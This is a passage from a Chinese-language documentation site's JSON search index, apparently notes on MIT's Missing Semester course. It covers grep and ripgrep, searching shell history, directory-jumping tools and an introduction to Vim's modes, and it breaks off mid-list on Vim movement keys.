<p><code>grep</code>\u00a0\u6709\u5f88\u591a\u9009\u9879\uff0c\u8fd9\u4e5f\u4f7f\u5b83\u6210\u4e3a\u4e00\u4e2a\u975e\u5e38\u5168\u80fd\u7684\u5de5\u5177\u3002\u5176\u4e2d\u6211\u7ecf\u5e38\u4f7f\u7528\u7684\u6709\u00a0<code>-C</code>\u00a0\uff1a\u83b7\u53d6\u67e5\u627e\u7ed3\u679c\u7684\u4e0a\u4e0b\u6587\uff08Context\uff09\uff1b<code>-v</code>\u00a0\u5c06\u5bf9\u7ed3\u679c\u8fdb\u884c\u53cd\u9009\uff08Invert\uff09\uff0c\u4e5f\u5c31\u662f\u8f93\u51fa\u4e0d\u5339\u914d\u7684\u7ed3\u679c\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u00a0<code>grep -C 5</code>\u00a0\u4f1a\u8f93\u51fa\u5339\u914d\u7ed3\u679c\u524d\u540e\u4e94\u884c\u3002\u5f53\u9700\u8981\u641c\u7d22\u5927\u91cf\u6587\u4ef6\u7684\u65f6\u5019\uff0c\u4f7f\u7528\u00a0<code>-R</code>\u00a0\u4f1a\u9012\u5f52\u5730\u8fdb\u5165\u5b50\u76ee\u5f55\u5e76\u641c\u7d22\u6240\u6709\u7684\u6587\u672c\u6587\u4ef6\u3002</p> <p>\u4f46\u662f\uff0c\u6211\u4eec\u6709\u5f88\u591a\u529e\u6cd5\u53ef\u4ee5\u5bf9\u00a0<code>grep -R</code>\u00a0\u8fdb\u884c\u6539\u8fdb\uff0c\u4f8b\u5982\u4f7f\u5176\u5ffd\u7565<code>.git</code>\u00a0\u6587\u4ef6\u5939\uff0c\u4f7f\u7528\u591aCPU\u7b49\u7b49\u3002</p> <p>\u56e0\u6b64\u4e5f\u51fa\u73b0\u4e86\u5f88\u591a\u5b83\u7684\u66ff\u4ee3\u54c1\uff0c\u5305\u62ec\u00a0ack,\u00a0ag\u00a0\u548c\u00a0rg\u3002\u5b83\u4eec\u90fd\u7279\u522b\u597d\u7528\uff0c\u4f46\u662f\u529f\u80fd\u4e5f\u90fd\u5dee\u4e0d\u591a\uff0c\u6211\u6bd4\u8f83\u5e38\u7528\u7684\u662f ripgrep (<code>rg</code>) \uff0c\u56e0\u4e3a\u5b83\u901f\u5ea6\u5feb\uff0c\u800c\u4e14\u7528\u6cd5\u975e\u5e38\u7b26\u5408\u76f4\u89c9\u3002\u4f8b\u5b50\u5982\u4e0b\uff1a</p> <pre><code># \u67e5\u627e\u6240\u6709\u4f7f\u7528\u4e86 requests \u5e93\u7684\u6587\u4ef6\nrg -t py 'import requests'\n# \u67e5\u627e\u6240\u6709\u6ca1\u6709\u5199 shebang \u7684\u6587\u4ef6\uff08\u5305\u542b\u9690\u85cf\u6587\u4ef6\uff09\nrg -u --files-without-match \"^#!\"\n# \u67e5\u627e\u6240\u6709\u7684foo\u5b57\u7b26\u4e32\uff0c\u5e76\u6253\u5370\u5176\u4e4b\u540e\u76845\u884c\nrg foo -A 5\n# \u6253\u5370\u5339\u914d\u7684\u7edf\u8ba1\u4fe1\u606f\uff08\u5339\u914d\u7684\u884c\u548c\u6587\u4ef6\u7684\u6570\u91cf\uff09\nrg --stats PATTERN\n</code></pre> <p>\u4e0e\u00a0<code>find</code>/<code>fd</code>\u00a0\u4e00\u6837\uff0c\u91cd\u8981\u7684\u662f\u4f60\u8981\u77e5\u9053\u6709\u4e9b\u95ee\u9898\u4f7f\u7528\u5408\u9002\u7684\u5de5\u5177\u5c31\u4f1a\u8fce\u5203\u800c\u89e3\uff0c\u800c\u5177\u4f53\u9009\u62e9\u54ea\u4e2a\u5de5\u5177\u5219\u4e0d\u662f\u90a3\u4e48\u91cd\u8981</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#vi5-shell","title":"VI.5 \u67e5\u627e shell \u547d\u4ee4","text":"<p><code>history</code>\u00a0\u547d\u4ee4\u5141\u8bb8\u60a8\u4ee5\u7a0b\u5e8f\u5458\u7684\u65b9\u5f0f\u6765\u8bbf\u95eeshell\u4e2d\u8f93\u5165\u7684\u5386\u53f2\u547d\u4ee4\u3002\u8fd9\u4e2a\u547d\u4ee4\u4f1a\u5728\u6807\u51c6\u8f93\u51fa\u4e2d\u6253\u5370shell\u4e2d\u7684\u91cc\u9762\u547d\u4ee4\u3002\u5982\u679c\u6211\u4eec\u8981\u641c\u7d22\u5386\u53f2\u8bb0\u5f55\uff0c\u5219\u53ef\u4ee5\u5229\u7528\u7ba1\u9053\u5c06\u8f93\u51fa\u7ed3\u679c\u4f20\u9012\u7ed9\u00a0<code>grep</code>\u00a0\u8fdb\u884c\u6a21\u5f0f\u641c\u7d22\u3002\u00a0<code>history | grep find</code>\u00a0\u4f1a\u6253\u5370\u5305\u542bfind\u5b50\u4e32\u7684\u547d\u4ee4\u3002</p> <p>\u5bf9\u4e8e\u5927\u591a\u6570\u7684shell\u6765\u8bf4\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u00a0<code>Ctrl+R</code>\u00a0\u5bf9\u547d\u4ee4\u5386\u53f2\u8bb0\u5f55\u8fdb\u884c\u56de\u6eaf\u641c\u7d22\u3002\u6572\u00a0<code>Ctrl+R</code>\u00a0\u540e\u60a8\u53ef\u4ee5\u8f93\u5165\u5b50\u4e32\u6765\u8fdb\u884c\u5339\u914d\uff0c\u67e5\u627e\u5386\u53f2\u547d\u4ee4\u884c\u3002</p> <p>\u53cd\u590d\u6309\u4e0b\u5c31\u4f1a\u5728\u6240\u6709\u641c\u7d22\u7ed3\u679c\u4e2d\u5faa\u73af\u3002\u5728\u00a0zsh\u00a0\u4e2d\uff0c\u4f7f\u7528\u65b9\u5411\u952e\u4e0a\u6216\u4e0b\u4e5f\u53ef\u4ee5\u5b8c\u6210\u8fd9\u9879\u5de5\u4f5c\u3002</p> <p><code>Ctrl+R</code>\u00a0\u53ef\u4ee5\u914d\u5408\u00a0fzf\u00a0\u4f7f\u7528\u3002<code>fzf</code>\u00a0\u662f\u4e00\u4e2a\u901a\u7528\u5bf9\u6a21\u7cca\u67e5\u627e\u5de5\u5177\uff0c\u5b83\u53ef\u4ee5\u548c\u5f88\u591a\u547d\u4ee4\u4e00\u8d77\u4f7f\u7528\u3002\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u5bf9\u5386\u53f2\u547d\u4ee4\u8fdb\u884c\u6a21\u7cca\u67e5\u627e\u5e76\u5c06\u7ed3\u679c\u4ee5\u8d4f\u5fc3\u60a6\u76ee\u7684\u683c\u5f0f\u8f93\u51fa\u3002</p> <p>\u53e6\u5916\u4e00\u4e2a\u548c\u5386\u53f2\u547d\u4ee4\u76f8\u5173\u7684\u6280\u5de7\u6211\u53ef\u4ee5\u79f0\u4e4b\u4e3a\u57fa\u4e8e\u5386\u53f2\u7684\u81ea\u52a8\u8865\u5168\u3002\u8fd9\u4e00\u7279\u6027\u6700\u521d\u662f\u7531\u00a0fish\u00a0shell \u521b\u5efa\u7684\uff0c\u5b83\u53ef\u4ee5\u6839\u636e\u60a8\u6700\u8fd1\u4f7f\u7528\u8fc7\u7684\u5f00\u5934\u76f8\u540c\u7684\u547d\u4ee4\uff0c\u52a8\u6001\u5730\u5bf9\u5f53\u524d\u5bf9 shell \u547d\u4ee4\u8fdb\u884c\u8865\u5168\u3002\u8fd9\u4e00\u529f\u80fd\u5728\u00a0zsh\u00a0\u4e2d\u4e5f\u53ef\u4ee5\u4f7f\u7528\uff0c\u5b83\u53ef\u4ee5\u6781\u5927\u7684\u63d0\u9ad8\u7528\u6237\u4f53\u9a8c\u3002</p> <p>\u4f60\u53ef\u4ee5\u4fee\u6539 shell history \u7684\u884c\u4e3a\uff0c\u4f8b\u5982\uff0c\u5982\u679c\u5728\u547d\u4ee4\u7684\u5f00\u5934\u52a0\u4e0a\u4e00\u4e2a\u7a7a\u683c\uff0c\u5b83\u5c31\u4e0d\u4f1a\u88ab\u52a0\u8fdbshell\u8bb0\u5f55\u4e2d\u3002\u5f53\u4f60\u8f93\u5165\u5305\u542b\u5bc6\u7801\u6216\u662f\u5176\u4ed6\u654f\u611f\u4fe1\u606f\u7684\u547d\u4ee4\u65f6\u4f1a\u7528\u5230\u8fd9\u4e00\u7279\u6027\u3002 \u4e3a\u6b64\u4f60\u9700\u8981\u5728<code>.bashrc</code>\u4e2d\u6dfb\u52a0<code>HISTCONTROL=ignorespace</code>\u6216\u8005\u5411<code>.zshrc</code>\u00a0\u6dfb\u52a0\u00a0<code>setopt HIST_IGNORE_SPACE</code>\u3002 \u5982\u679c\u4f60\u4e0d\u5c0f\u5fc3\u5fd8\u4e86\u5728\u524d\u9762\u52a0\u7a7a\u683c\uff0c\u53ef\u4ee5\u901a\u8fc7\u7f16\u8f91\u3002<code>bash_history</code>\u6216\u00a0<code>.zhistory</code>\u00a0\u6765\u624b\u52a8\u5730\u4ece\u5386\u53f2\u8bb0\u5f55\u4e2d\u79fb\u9664\u90a3\u4e00\u9879</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#vi6","title":"VI.6 \u67e5\u627e\u6587\u4ef6\u5939","text":"<p>\uff08\u6bd4\u8f83\u6df1\u4e00\u4e9b\uff0c\u6162\u6162\u5b66\uff09</p> <p>\u4e4b\u524d\u5bf9\u6240\u6709\u64cd\u4f5c\u6211\u4eec\u90fd\u9ed8\u8ba4\u4e00\u4e2a\u524d\u63d0\uff0c\u5373\u60a8\u5df2\u7ecf\u4f4d\u4e8e\u60f3\u8981\u6267\u884c\u547d\u4ee4\u7684\u76ee\u5f55\u4e0b\uff0c\u4f46\u662f\u5982\u4f55\u624d\u80fd\u9ad8\u6548\u5730\u5728\u76ee\u5f55 \u95f4\u968f\u610f\u5207\u6362\u5462\uff1f\u6709\u5f88\u591a\u7b80\u4fbf\u7684\u65b9\u6cd5\u53ef\u4ee5\u505a\u5230\uff0c\u6bd4\u5982\u8bbe\u7f6ealias\uff0c\u4f7f\u7528\u00a0ln -s\u00a0\u521b\u5efa\u7b26\u53f7\u8fde\u63a5\u7b49\u3002\u800c\u5f00\u53d1\u8005\u4eec\u5df2\u7ecf\u60f3\u5230\u4e86\u5f88\u591a\u66f4\u4e3a\u7cbe\u5999\u7684\u89e3\u51b3\u65b9\u6848\u3002</p> <p>\u7531\u4e8e\u672c\u8bfe\u7a0b\u7684\u76ee\u7684\u662f\u5c3d\u53ef\u80fd\u5bf9\u4f60\u7684\u65e5\u5e38\u4e60\u60ef\u8fdb\u884c\u4f18\u5316\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528<code>fasd</code>\u548c\u00a0autojump\u00a0\u8fd9\u4e24\u4e2a\u5de5\u5177\u6765\u67e5\u627e\u6700\u5e38\u7528\u6216\u6700\u8fd1\u4f7f\u7528\u7684\u6587\u4ef6\u548c\u76ee\u5f55\u3002</p> <p>Fasd \u57fa\u4e8e\u00a0frecency\u00a0\u5bf9\u6587\u4ef6\u548c\u6587\u4ef6\u6392\u5e8f\uff0c\u4e5f\u5c31\u662f\u8bf4\u5b83\u4f1a\u540c\u65f6\u9488\u5bf9\u9891\u7387\uff08frequency\uff09\u548c\u65f6\u6548\uff08recency\uff09\u8fdb\u884c\u6392\u5e8f\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c<code>fasd</code>\u4f7f\u7528\u547d\u4ee4\u00a0<code>z</code>\u00a0\u5e2e\u52a9\u6211\u4eec\u5feb\u901f\u5207\u6362\u5230\u6700\u5e38\u8bbf\u95ee\u7684\u76ee\u5f55\u3002\u4f8b\u5982\uff0c \u5982\u679c\u60a8\u7ecf\u5e38\u8bbf\u95ee<code>/home/user/files/cool_project</code>\u00a0\u76ee\u5f55\uff0c\u90a3\u4e48\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u00a0<code>z cool</code>\u00a0\u8df3\u8f6c\u5230\u8be5\u76ee\u5f55\u3002\u5bf9\u4e8e autojump\uff0c\u5219\u4f7f\u7528<code>j cool</code>\u4ee3\u66ff\u5373\u53ef\u3002</p> <p>\u8fd8\u6709\u4e00\u4e9b\u66f4\u590d\u6742\u7684\u5de5\u5177\u53ef\u4ee5\u7528\u6765\u6982\u89c8\u76ee\u5f55\u7ed3\u6784\uff0c\u4f8b\u5982\u00a0<code>tree</code>,\u00a0<code>broot</code>\u00a0\u6216\u66f4\u52a0\u5b8c\u6574\u7684\u6587\u4ef6\u7ba1\u7406\u5668\uff0c\u4f8b\u5982\u00a0<code>nnn</code>\u00a0\u6216\u00a0<code>ranger</code></p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#vii","title":"VII \u5c0f\u7ed3","text":"<p>\u4e24\u7bc7\u7b14\u8bb0\u53ea\u662f\u8ba9\u6211\u4eec\u521d\u6b65\u7aa5\u89c1 bash \u7684\u529f\u80fd\u4ee5\u53ca\u53ef\u4ee5\u600e\u4e48\u4f7f\u7528\uff0c\u4f46\u771f\u6b63\u719f\u7ec3\u5730\u4f7f\u7528\u5fc5\u7136\u662f\u4f34\u968f\u7740\u5927\u91cf\u7684\u4f7f\u7528\uff0c\u4ee5\u53ca\u5728\u5b9e\u9645\u5b66\u4e60\u548c\u5de5\u4f5c\u4e2d\u5982\u4f55\u53bb\u53d1\u6325\u4f5c\u7528\uff0c\u8fd9\u624d\u5e94\u5f53\u662f\u6211\u4eec\u8981\u5173\u6ce8\u7684\u3002</p> <p>\u6b64\u5916\uff0cmissing-semester \u672c\u8eab\u7559\u4e86\u51e0\u4e2a\u4f5c\u4e1a\uff0c\u73b0\u5728\u6765\u770b\u96be\u5ea6\u4e0d\u5c0f\uff0c\u4e0d\u59a8\u4e0b\u6b21\u590d\u4e60\u6765\u505a\uff1f</p>","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/1_shell-script-and-basic-tools/#_1","title":"\u53c2\u8003\u6587\u6863","text":"","tags":["MIT","blog","note"]},{"location":"tutorial/MIT/2_learn-to-use-Vim-editor/","title":"2 learn to use Vim editor","text":"Summary <p>\u672c\u6587\u4ecb\u7ecd\u4e86\u5b66\u4e60\u4f7f\u7528 Vim \u7f16\u8f91\u5668\u7684\u597d\u5904\u548c\u65b9\u6cd5\u3002</p> <ul> <li>Vim \u7684\u4f18\u70b9\uff1a \u9002\u7528\u4e8e\u4ee3\u7801\u7f16\u8f91\uff0c\u907f\u514d\u9f20\u6807\u548c\u4e0a\u4e0b\u5de6\u53f3\u952e\uff0c\u63d0\u9ad8\u7f16\u8f91\u6548\u7387\u3002</li> <li>Vim \u7684\u5b66\u4e60\u66f2\u7ebf\uff1a \u521d\u671f\u5b66\u4e60\u8f83\u96be\uff0c\u4f46\u638c\u63e1\u540e\u6548\u7387\u5927\u5e45\u63d0\u5347\u3002</li> <li>Vim \u7684\u7f16\u8f91\u6a21\u5f0f\uff1a \u666e\u901a\u6a21\u5f0f\u3001\u63d2\u5165\u6a21\u5f0f\u3001\u53ef\u89c6\u6a21\u5f0f\u3001\u9009\u62e9\u6a21\u5f0f\u3001\u547d\u4ee4\u6a21\u5f0f\u3001Ex \u6a21\u5f0f\u3002</li> <li>Vim \u7684\u7f13\u5b58\u3001\u6807\u7b7e\u9875\u3001\u7a97\u53e3\uff1a \u4e00\u4e2a Vim \u4f1a\u8bdd\u5305\u542b\u591a\u4e2a\u6807\u7b7e\u9875\uff0c\u6bcf\u4e2a\u6807\u7b7e\u9875\u5305\u542b\u591a\u4e2a\u7a97\u53e3\uff0c\u4e00\u4e2a\u7f13\u5b58\u53ef\u4ee5\u5728\u591a\u4e2a\u7a97\u53e3\u6253\u5f00\u3002</li> </ul>","tags":["MIT","note"]},{"location":"tutorial/MIT/2_learn-to-use-Vim-editor/#i-vim","title":"I \u4e3a\u4ec0\u4e48\u5b66 Vim","text":"<p>\u653e\u7740\u597d\u7aef\u7aef\u7684\u7c7b\u4f3c\u4e8e word \u4ee5\u53ca\u50cf\u6211\u4eec\u73b0\u5728\u7528\u7684 obsidian \u7b49\u7f16\u8f91\u5668\u4e0d\u7528\uff0c\u4e3a\u4ec0\u4e48\u8981\u5b66\u4ec0\u4e48 vim \u6216\u8005\u8bf4 Emacs \u7b49\u7c7b\u4f3c\u5de5\u5177\u5462\uff1f</p> <p>Quote</p> <p>\u5199\u4f5c\u548c\u5199\u4ee3\u7801\u5176\u5b9e\u662f\u4e24\u9879\u975e\u5e38\u4e0d\u540c\u7684\u6d3b\u52a8\u3002\u5f53\u6211\u4eec\u7f16\u7a0b\u7684\u65f6\u5019\uff0c\u4f1a\u7ecf\u5e38\u5728\u6587\u4ef6\u95f4\u8fdb\u884c\u5207\u6362\u3001\u9605\u8bfb\u3001\u6d4f\u89c8\u548c\u4fee\u6539\u4ee3\u7801\uff0c\u800c\u4e0d\u662f\u8fde\u7eed\u7f16\u5199\u4e00\u5927\u6bb5\u7684\u6587\u5b57\u3002\u56e0\u6b64\u4ee3\u7801\u7f16\u8f91\u5668\u548c\u6587\u672c\u7f16\u8f91\u5668\u662f\u5f88\u4e0d\u540c\u7684\u4e24\u79cd\u5de5\u5177\uff08\u4f8b\u5982\u5fae\u8f6f\u7684 Word \u4e0e Visual Studio Code\uff09\u3002\u4f5c\u4e3a\u7a0b\u5e8f\u5458\uff0c\u6211\u4eec\u5927\u90e8\u5206\u65f6\u95f4\u90fd\u82b1\u5728\u4ee3\u7801\u7f16\u8f91\u4e0a\uff0c\u6240\u4ee5\u82b1\u70b9\u65f6\u95f4\u638c\u63e1\u67d0\u4e2a\u9002\u5408\u81ea\u5df1\u7684\u7f16\u8f91\u5668\u662f\u975e\u5e38\u503c\u5f97\u7684</p> <p>missing-semester \u4e0a\u662f\u8fd9\u4e48\u8bf4\u7684\uff0c\u6211\u60f3\u8fd9\u7c7b\u7f16\u8f91\u5668\u610f\u4e49\u4e5f\u6b63\u662f\u5982\u6b64\uff1b\u81f3\u4e8e\u4e3a\u4ec0\u4e48\u662f vim\uff0c\u7406\u7531\u9887\u591a\uff0c\u8bfb\u8005\u53ef\u4ee5\u81ea\u884c\u4e86\u89e3\u8fd9\u7c7b\u7f16\u8f91\u5668\u4e4b\u95f4\u7684\u533a\u522b\uff0c\u4e00\u4e2a\u53c2\u8003\u662f Stack Overflow \u7684\u8c03\u67e5</p> <p>\u5f53\u7136\uff0c\u4e00\u4e2a\u5728 Linux \u540c\u6837\u4f7f\u7528\u8f83\u591a\u7684\u4ee3\u66ff\u54c1\u662f nano \uff0c\u8fd9\u91cc\u662f\u4e00\u4e2a\u6559\u7a0b</p>","tags":["MIT","note"]},{"location":"tutorial/MIT/2_learn-to-use-Vim-editor/#ii-vim","title":"II Vim \u7684\u54f2\u5b66","text":"<p>Vim \u662f\u4e00\u4e2a\u591a\u6a21\u6001\u7f16\u8f91\u5668\uff1a\u5b83\u5bf9\u4e8e\u63d2\u5165\u6587\u5b57\u548c\u64cd\u7eb5\u6587\u5b57\u6709\u4e0d\u540c\u7684\u6a21\u5f0f\u3002Vim \u662f\u53ef\u7f16\u7a0b\u7684\uff08\u53ef\u4ee5\u4f7f\u7528 Vimscript \u6216\u8005\u50cf Python \u4e00\u6837\u7684\u5176\u4ed6\u7a0b\u5e8f\u8bed\u8a00\uff09\uff0cVim \u7684\u63a5\u53e3\u672c\u8eab\u4e5f\u662f\u4e00\u4e2a\u7a0b\u5e8f\u8bed\u8a00\uff1a\u952e\u5165\u64cd\u4f5c\uff08\u4ee5\u53ca\u5176\u52a9\u8bb0\u540d\uff09 \u662f\u547d\u4ee4\uff0c\u8fd9\u4e9b\u547d\u4ee4\u4e5f\u662f\u53ef\u7ec4\u5408\u7684\u3002Vim \u907f\u514d\u4e86\u4f7f\u7528\u9f20\u6807\uff0c\u56e0\u4e3a\u90a3\u6837\u592a\u6162\u4e86\uff1bVim \u751a\u81f3\u907f\u514d\u7528\u4e0a\u4e0b\u5de6\u53f3\u952e\u56e0\u4e3a\u90a3\u6837\u9700\u8981\u592a\u591a\u7684\u624b\u6307\u79fb\u52a8\u3002 \u8fd9\u6837\u7684\u8bbe\u8ba1\u54f2\u5b66\u4f7f\u5f97 Vim \u6210\u4e3a\u4e86\u4e00\u4e2a\u80fd\u8ddf\u4e0a\u4f60\u601d\u7ef4\u901f\u5ea6\u7684\u7f16\u8f91\u5668\u3002</p> <p>\u66f4\u52a0\u8be6\u7ec6\u4ecb\u7ecd\u53ef\u89c1\u7ef4\u57fa\u767e\u79d1\uff0c\u6211\u4eec\u5c06\u5728\u4e0b\u9762\u8bb2\u89e3\u6bd4\u8f83\u5e38\u7528\u7684\u5185\u5bb9\u3002</p>","tags":["MIT","note"]},{"location":"tutorial/MIT/2_learn-to-use-Vim-editor/#iii","title":"III \u5b66\u4e60\u66f2\u7ebf","text":"Wiki <p>\u5728\u7ef4\u57fa\u767e\u79d1 \u4e0a\u5c31\u8868\u660e\u4e86\uff1a\u5bf9\u4e8e\u5927\u591a\u6570\u7528\u6237\u6765\u8bf4\uff0cVim\u6709\u7740\u4e00\u4e2a\u6bd4\u8f83\u9661\u5ced\u7684\u5b66\u4e60\u66f2\u7ebf\u3002\u8fd9\u610f\u5473\u7740\u5f00\u59cb\u5b66\u4e60\u7684\u65f6\u5019\u53ef\u80fd\u4f1a\u8fdb\u5c55\u7f13\u6162\uff0c\u4f46\u662f\u4e00\u65e6\u638c\u63e1\u4e00\u4e9b\u57fa\u672c\u64cd\u4f5c\u4e4b\u540e\uff0c\u80fd\u5927\u5e45\u5ea6\u63d0\u9ad8\u7f16\u8f91\u6548\u7387\u3002\u4e3a\u4e86\u5e2e\u52a9\u5b66\u4e60\uff0cVim\u4e3a\u521d\u5b66\u8005\u51c6\u5907\u4e86Vim\u6559\u5b66\u3002\u901a\u5e38\u53ef\u4ee5\u5728Unix\u7cfb\u7edf\u547d\u4ee4\u884c\u4e0b\u8f93\u5165\"vimtutor\"\u6216\u8005\u70b9\u51fbWindows\u7cfb\u7edf\u684c\u9762\u4e0a\u7684Vim\u6559\u5b66\u56fe\u6807\u8fdb\u5165\u3002\u5728Vim\u7528\u6237\u624b\u518c\u4e2d\u66f4\u52a0\u8be6\u7ec6\u7684\u63cf\u8ff0\u4e86Vim\u7684\u57fa\u7840\u548c\u8fdb\u9636\u529f\u80fd\u3002\u53ef\u4ee5\u5728Vim\u4e2d\u8f93\u5165\":help user-manual\"\u8fdb\u5165\u7528\u6237\u624b\u518c\u3002\u624b\u518c\u9664\u4e86\u539f\u59cb\u7684\u82f1\u6587\u7248\u672c\u4e4b\u5916\uff0c\u4e5f\u88ab\u5fd7\u613f\u8005\u7ffb\u8bd1\u6210\u4e86\u5404\u56fd\u6587\u5b57\uff0c\u5176\u4e2d\u5305\u62ec\u4e2d\u6587\u3002\u65b0\u7528\u6237\u4e5f\u5e94\u8be5\u5b66\u4e60Vim\u7684\u5e2e\u52a9\u7cfb\u7edf\u3002\u53ef\u4ee5\u5728Vim\u4e2d\u8f93\u5165\u4e0d\u5e26\u53c2\u6570\u7684\"help\"\u6765\u9605\u8bfb\u4e3b\u5e2e\u52a9\u6587\u4ef6</p> <p>\u672c\u6587\u662f\u8ba9\u8bfb\u8005\u521d\u8bc6Vim\uff0c\u8bb2\u89e3\u4e0d\u751a\u8be6\u7ec6\uff0c\u4f1a\u5217\u51fa\u5e38\u7528\u9879\uff1b\u6709\u6240\u4e0d\u660e\u6240\u4ee5\u4e5f\u7b97\u6b63\u5e38\uff0c\u6211\u4eec\u5c06\u5728\u540e\u9762\u6216\u8005\u662f\u63d0\u4f9b\u7684\u94fe\u63a5\u4e2d\u8be6\u7ec6\u8fdb\u884c\u8bb2\u89e3</p> <p>\u5176\u4ed6\u6559\u7a0b\u4e5f\u6709\u4e0d\u9519\u7684\uff0c\u5728 CS \u81ea\u5b66\u6307\u5357\u4e2d\u5c31\u6709\u63a8\u8350\uff0c\u4e0d\u52a0\u8d58\u8ff0</p>","tags":["MIT","note"]},{"location":"tutorial/MIT/2_learn-to-use-Vim-editor/#iv-vim","title":"IV Vim \u7684\u63a5\u53e3\u5176\u5b9e\u662f\u4e00\u79cd\u7f16\u7a0b\u8bed\u8a00","text":"<p>Vim \u6700\u91cd\u8981\u7684\u8bbe\u8ba1\u601d\u60f3\u662f Vim \u7684\u754c\u9762\u672c\u8eab\u662f\u4e00\u4e2a\u7a0b\u5e8f\u8bed\u8a00\u3002\u952e\u5165\u64cd\u4f5c\uff08\u4ee5\u53ca\u4ed6\u4eec\u7684\u52a9\u8bb0\u540d\uff09 \u672c\u8eab\u662f\u547d\u4ee4\uff0c\u6bd4\u5982\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u7528 <code>3j</code> \u6765\u8bb2\u5149\u6807\u4e0b\u79fb\u4e09\u884c\uff0c\u800c\u4e0d\u7528\u5c06\u624b\u79fb\u52a8\u5230\u65b9\u5411\u952e\u4e0a\u5e76\u4e14\u6309\u4e09\u6b21</p> <p>\u8fd9\u4e9b\u547d\u4ee4\u53ef\u4ee5\u7ec4\u5408\u4f7f\u7528\u3002\u8fd9\u4f7f\u5f97\u79fb\u52a8\u548c\u7f16\u8f91\u66f4\u52a0\u9ad8\u6548\uff0c\u7279\u522b\u662f\u4e00\u65e6\u5f62\u6210\u808c\u8089\u8bb0\u5fc6\u3002</p>","tags":["MIT","note"]},{"location":"tutorial/MIT/2_learn-to-use-Vim-editor/#v","title":"V \u7f16\u8f91\u6a21\u5f0f","text":"<p>Vim \u7684\u8bbe\u8ba1\u4ee5\u5927\u591a\u6570\u65f6\u95f4\u90fd\u82b1\u5728\u9605\u8bfb\u3001\u6d4f\u89c8\u548c\u8fdb\u884c\u5c11\u91cf\u7f16\u8f91\u6539\u52a8\u4e3a\u57fa\u7840\uff0c\u56e0\u6b64\u5b83\u5177\u67096\u79cd\u57fa\u672c\u6a21\u5f0f\u548c5\u79cd\u6d3e\u751f\u6a21\u5f0f\uff1a</p> <p>\u5728\u9ed8\u8ba4\u8bbe\u7f6e\u4e0b\uff0cVim \u4f1a\u5728\u5de6\u4e0b\u89d2\u663e\u793a\u5f53\u524d\u7684\u6a21\u5f0f\u3002Vim \u542f\u52a8\u65f6\u7684\u9ed8\u8ba4\u6a21\u5f0f\u662f\u666e\u901a\u6a21\u5f0f\u3002\u901a\u5e38\u4f60\u4f1a\u628a\u5927\u90e8\u5206 \u65f6\u95f4\u82b1\u5728\u666e\u901a\u6a21\u5f0f\u548c\u63d2\u5165\u6a21\u5f0f\u3002</p> <p>\u4f60\u53ef\u4ee5\u6309\u4e0b\u00a0<code>&lt;ESC&gt;</code>\uff08\u9000\u51fa\u952e\uff09\u4ece\u4efb\u4f55\u5176\u4ed6\u6a21\u5f0f\u8fd4\u56de\u666e\u901a\u6a21\u5f0f\u3002\u5728\u666e\u901a\u6a21\u5f0f\uff0c\u952e\u5165\u00a0<code>i</code>\u00a0\u8fdb\u5165\u63d2\u5165\u6a21\u5f0f\uff0c<code>R</code>\u00a0\u8fdb\u5165\u66ff\u6362\u6a21\u5f0f\uff0c<code>v</code>\u00a0\u8fdb\u5165\u53ef\u89c6\uff08\u4e00\u822c\uff09\u6a21\u5f0f\uff0c<code>V</code>\u00a0\u8fdb\u5165\u53ef\u89c6\uff08\u884c\uff09\u6a21\u5f0f\uff0c<code>&lt;C-v&gt;</code>\u00a0\uff08Ctrl-V, \u6709\u65f6\u4e5f\u5199\u4f5c\u00a0<code>^V</code>\uff09\u8fdb\u5165\u53ef\u89c6\uff08\u5757\uff09\u6a21\u5f0f\uff0c<code>:</code>\u00a0\u8fdb\u5165\u547d\u4ee4\u6a21\u5f0f</p> <p>\u57fa\u4e8e\u6709\u4e9b\u6309\u952e\u7ecf\u5e38\u6027\u4f7f\u7528\u4e14\u4ecd\u7136\u4e0d\u662f\u5341\u5206\u65b9\u4fbf\uff08\u5982 <code>Esc</code> \u952e\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u81ea\u5b9a\u4e49\u6309\u952e\uff0c\u8bfb\u8005\u53ef\u4ee5\u81ea\u884c\u641c\u7d22</p>","tags":["MIT","note"]},{"location":"tutorial/MIT/2_learn-to-use-Vim-editor/#v1","title":"V.1 \u57fa\u672c\u6a21\u5f0f","text":"","tags":["MIT","note"]},{"location":"tutorial/MIT/2_learn-to-use-Vim-editor/#v11","title":"V.1.1 \u666e\u901a\u6a21\u5f0f","text":"<p>\u5728\u666e\u901a\u6a21\u5f0f\u4e2d\uff0c\u7528\u7684\u7f16\u8f91\u5668\u547d\u4ee4\uff0c\u6bd4\u5982\u79fb\u52a8\u5149\u6807\uff0c\u5220\u9664\u6587\u672c\u7b49\u7b49\u3002\u8fd9\u4e5f\u662fVim\u542f\u52a8\u540e\u7684\u9ed8\u8ba4\u6a21\u5f0f\u3002\u8fd9\u6b63\u597d\u548c\u8bb8\u591a\u65b0\u7528\u6237\u671f\u5f85\u7684\u64cd\u4f5c\u65b9\u5f0f\u76f8\u53cd\uff08\u5927\u591a\u6570\u7f16\u8f91\u5668\u9ed8\u8ba4\u6a21\u5f0f\u4e3a\u63d2\u5165\u6a21\u5f0f\uff09\u3002</p> <p>\u591a\u6570\u65f6\u5019\u4f60\u4f1a\u5728\u666e\u901a\u6a21\u5f0f\u4e0b\uff0c\u4f7f\u7528\u79fb\u52a8\u547d\u4ee4\u5728\u7f13\u5b58\u4e2d\u5bfc\u822a\u3002\u5728 Vim \u91cc\u9762\u79fb\u52a8\u4e5f\u88ab\u79f0\u4e3a \u201c\u540d\u8bcd\u201d\uff0c \u56e0\u4e3a\u5b83\u4eec\u6307\u5411\u6587\u5b57\u5757\u3002</p> <ul> <li>\u57fa\u672c\u79fb\u52a8:\u00a0<code>hjkl</code>\u00a0\uff08\u5de6\uff0c 